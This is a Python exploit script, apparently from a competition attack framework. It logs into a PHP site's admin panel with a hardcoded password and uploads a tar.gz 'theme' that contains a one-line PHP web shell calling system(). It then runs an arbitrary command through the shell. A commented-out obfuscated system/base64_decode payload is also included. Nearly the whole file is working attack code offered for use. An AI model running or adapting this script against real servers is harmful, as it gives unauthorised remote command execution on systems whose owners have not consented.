#!/usr/bin/env python

from framework.http import http
from framework.config import *
from framework.function import *
from urllib import quote
import traceback
import hashlib
import os
import requests

def random_string():
    return hashlib.md5(str(time.time())).hexdigest()

def vulnerable_attack(target,target_port,cmd):
        
    '''
    this is the payload script for vuln:
    
    /admin.php?action=themeinstall
    '''
    
    try:           
        # This payload may not work under some php versions
        #payload = "('sy'.'stem')(('bas'.'e64_'.'decode')('%s'))==0"%cmd
        #print payload
        s = requests.session()
	url_1 = "http://%s:%d/login.php"%(target,int(target_port))
	url_2 = "http://%s:%d/admin.php?action=themeinstall"%(target,int(target_port))
	my_hash = random_string()
	s.post(url_1,data="cont1=123456789&bogus=&submit=Log+in",headers={"Accept-Encoding":"identity","Content-Type": "application/x-www-form-urlencoded"})

	shell_content = "<?php system($_REQUEST['%s']);?>" %my_hash
	file_name = my_hash + ".php"
	tar_name = my_hash + ".tar.gz"
	open('/tmp/%s'%file_name,'w').write(shell_content)
	res = os.popen('cd /tmp;tar cvfz %s %s'%(tar_name,file_name)).read()
	debug_print(res)
	data = {"submit":"Upload"}
	files = {"sendfile":open("/tmp/"+tar_name,'rb')}
	s.post(url_2,data=data,files=files,headers={"Accept-Encoding":"identity"})
	res = os.popen('rm /tmp/%s /tmp/%s'%(file_name,tar_name)).read()
	debug_print(res)
			

	data = '%s=%s'% (my_hash,quote(cmd))
        res = http("post",target,target_port,"/data/themes/%s"%(file_name),data,headers=headers)
    except Exception,e:
        debug_print(traceback.format_exc())     
        dump_error("attack failed",target,"vulnerable attack")
        res = "error"

    return res




